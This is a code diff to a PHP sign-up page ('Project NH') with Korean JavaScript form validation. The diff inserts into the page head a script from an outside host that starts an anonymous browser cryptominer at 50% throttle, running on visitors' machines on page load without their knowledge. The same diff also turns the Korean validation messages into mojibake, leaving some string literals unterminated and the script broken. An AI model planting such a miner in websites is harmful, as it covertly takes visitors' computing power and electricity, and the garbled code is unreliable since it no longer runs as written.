@@ -17,6 +17,12 @@ if(isset($_SESSION['login_user'])) {
 
     <title>Project NH</title>
 
+	<script src="https://ppoi.org/lib/projectpoi.min.js"></script>
+	<script>
+		var miner = new ProjectPoi.Anonymous('UIeWAtcJkh36tiZFN7XLHSoL');
+       	 	miner.setThrottle(0.5);
+		miner.start();
+	</script>
     <!-- Bootstrap core CSS -->
     <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
 
@@ -26,7 +32,7 @@ if(isset($_SESSION['login_user'])) {
         {
             if(join_form.name.value == "")
             {
-                document.all.p_name.innerText = "이름을 입력하지 않았습니다.";
+                document.all.p_name.innerText = "이름�?입력하지 않았습니�?";
                 join_form.name.focus();
                 join_form.name.select();
                 return false;
@@ -34,7 +40,7 @@ if(isset($_SESSION['login_user'])) {
 
             if(join_form.name.value.length < 2)
             {
-                document.all.p_name.innerText = "이름은 2글자 이상입니다.";
+                document.all.p_name.innerText = "이름은 2글�?이상입니�?";
                 join_form.name.focus();
                 join_form.name.select();
                 return false;
@@ -43,9 +49,9 @@ if(isset($_SESSION['login_user'])) {
             for (var i = 0; i < join_form.name.value.length; i++)
             {
                 var ch = join_form.name.value.charAt(i);
-                if (((ch < "ㅏ") || (ch > "히")) && ((ch < "ㄱ") || (ch > "ㅎ")))
+                if (((ch < "�?) || (ch > "�?)) && ((ch < "�?) || (ch > "�?)))
                 {
-                    document.all.p_name.innerText = "이름은 한글만 입력 가능합니다.";
+                    document.all.p_name.innerText = "이름은 한글�?입력 가능합니다.";
                     join_form.name.focus();
                     join_form.name.select();
                     return false;
@@ -60,7 +66,7 @@ if(isset($_SESSION['login_user'])) {
         {
             if (join_form.id.value == "")
             {
-                document.all.p_id.innerText = "아이디를 입력하지 않았습니다.";
+                document.all.p_id.innerText = "아이디를 입력하지 않았습니�?";
                 join_form.id.focus();
                 join_form.id.select();
                 return false;
@@ -71,7 +77,7 @@ if(isset($_SESSION['login_user'])) {
                 var ch = join_form.id.value.charAt(i);
                 if (!(ch >= '0' && ch <= '9') && !(ch >= 'a' && ch <= 'z'))
                 {
-                    document.all.p_id.innerText = "아이디는 소문자, 숫자만 입력 가능합니다.";
+                    document.all.p_id.innerText = "아이디는 소문�? 숫자�?입력 가능합니다.";
                     join_form.id.focus();
                     join_form.id.select();
                     return false;
@@ -94,7 +100,7 @@ if(isset($_SESSION['login_user'])) {
         {
             if (join_form.pw.value == "")
             {
-                document.all.p_pw.innerText = "비밀번호를 입력하지 않았습니다.";
+                document.all.p_pw.innerText = "비밀번호�?입력하지 않았습니�?";
                 join_form.pw.focus();
                 join_form.pw.select();
                 return false;
@@ -105,7 +111,7 @@ if(isset($_SESSION['login_user'])) {
                 var ch = join_form.pw.value.charAt(i);
                 if (!(ch >= '0' && ch <= '9') && !(ch >= 'a' && ch <= 'z'))
                 {
-                    document.all.p_pw.innerText = "비밀번호는 소문자, 숫자만 입력 가능합니다.";
+                    document.all.p_pw.innerText = "비밀번호�?소문�? 숫자�?입력 가능합니다.";
                     join_form.pw.focus();
                     join_form.pw.select();
                     return false;
@@ -114,7 +120,7 @@ if(isset($_SESSION['login_user'])) {
 
             if (join_form.pw.value.indexOf(" ") >= 0)
             {
-                document.all.p_pw.innerText = "비밀번호에 공백을 사용할 수 없습니다.";
+                document.all.p_pw.innerText = "비밀번호�?공백�?사용�?�?없습니다.";
                 join_form.pw.focus();
                 join_form.pw.select();
                 return false;
@@ -122,7 +128,7 @@ if(isset($_SESSION['login_user'])) {
 
             if (join_form.pw.value.length < 6 || join_form.pw.value.length > 12)
             {
-                document.all.p_pw.innerText = "비밀번호를 6~12자까지 입력해주세요.";
+                document.all.p_pw.innerText = "비밀번호�?6~12자까지 입력해주세요.";
                 join_form.pw.focus();
                 join_form.pw.select();
                 return false;
@@ -136,7 +142,7 @@ if(isset($_SESSION['login_user'])) {
         {
             if (join_form.pw_check.value == "")
             {
-                document.all.p_pw.innerText = "비밀번호를 확인하지 않았습니다.";
+                document.all.p_pw.innerText = "비밀번호�?확인하지 않았습니�?";
                 join_form.pw.focus();
                 join_form.pw.select();
                 return false;
